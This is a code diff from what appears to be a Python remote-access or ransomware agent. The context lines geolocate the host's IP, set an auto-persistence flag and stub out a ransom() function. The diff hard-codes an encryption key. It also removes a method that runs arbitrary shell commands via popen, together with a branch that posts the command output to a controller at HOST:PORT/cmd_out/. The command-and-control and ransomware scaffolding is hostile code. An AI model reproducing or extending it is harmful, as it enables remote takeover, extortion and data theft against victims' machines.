@@ -28,8 +28,7 @@ GEO = json.JSONDecoder().decode(requests.get("https://ip-api.io/json/"+IP).conte
 COORDS = {'lat':json.JSONDecoder().decode(requests.get("https://ip-api.io/json/"+IP).content.decode()).get("latitude"), 
           'long':json.JSONDecoder().decode(requests.get("https://ip-api.io/json/"+IP).content.decode()).get("longitude") }
 AUTO_PERSISTENCE = True
-KEY = Crypto.Hash.MD5.new(Crypto.Hash.SHA512.new(USER.encode()).hexdigest().encode()).hexdigest() #len(KEY) = 16 or multiple
-ENC = AES.new(KEY.encode(), AES.MODE_CBC)
+KEY = '3b732d7aaaefb3d3b68be37f04292a1c'
 
 #Modules
 class Modules():
@@ -117,8 +116,7 @@ class Modules():
     def ransom(self):
         return 0
     
-    def exe(self, cmd):
-        return str(platform.popen(cmd).read())       
+          
         
 
 
@@ -164,9 +162,7 @@ class Core():
             MODS.ransom()
             pass
             
-        else:
-            requests.post(HOST+":"+PORT+"/cmd_out/", json={'KEY':KEY,'OUT':MODS.exe(cmd), 'IN':cmd})
-            pass
+        
             
 
 agent = Core()
